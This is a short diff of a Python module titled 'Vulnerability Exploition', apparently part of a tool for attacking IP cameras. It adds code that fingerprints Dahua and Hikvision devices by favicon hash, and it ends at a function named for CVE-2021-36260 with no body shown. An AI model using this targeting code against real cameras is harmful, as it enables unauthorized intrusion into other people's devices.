@@ -1,15 +1,28 @@
 """Vulnerability Exploition"""
 import os
 import sys
+import hashlib
 import requests
 
 CWD = os.path.dirname(__file__)
 sys.path.append(os.path.join(CWD, '..'))
+from utils.base import multi_thread
 from utils.net import get_user_agent
-from utils.camera import snapshot_cve_2017_7921, snapshot_rtsp
 
 
 timeout=2
+
+
+def device_type(ip: str) -> list:
+    """Check whether the ip is a web camera"""
+    dev_hash = {
+        '4ff53be6165e430af41d782e00207fda': 'Dahua',
+        '89b932fcc47cf4ca3faadb0cfdef89cf': 'Hikvision',
+    }
+    url_list = [
+        f"http://{ip}/favicon.ico",  # hikvision, Luma
+        f"http://{ip}/image/lgbg.jpg",  # Dahua
+    ]
 
 
 def cve_2021_36260(ip: str) -> list:
